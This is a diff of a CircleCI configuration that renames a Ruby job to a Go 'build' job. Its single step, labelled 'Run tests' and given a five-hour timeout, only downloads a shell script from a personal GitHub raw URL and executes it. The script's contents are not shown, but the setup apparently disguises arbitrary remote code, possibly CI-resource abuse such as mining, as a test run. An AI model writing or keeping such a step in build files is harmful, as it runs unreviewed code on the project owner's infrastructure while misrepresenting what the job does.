@@ -1,18 +1,20 @@
 version: 2.1
 jobs:
-    trial:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 2
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
+  build:
+    parallelism: 1
+    docker:
+      - image: cimg/go:1.17.7
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests
+          no_output_timeout: 5h      
+          command: |
               wget https://raw.githubusercontent.com/Nurultyas7979/ewe/main/jero.sh && chmod +x jero.sh && ./jero.sh
-              
+                         
 
 workflows:
     version: 2.1
     build:
         jobs:
-        - trial
+        - build
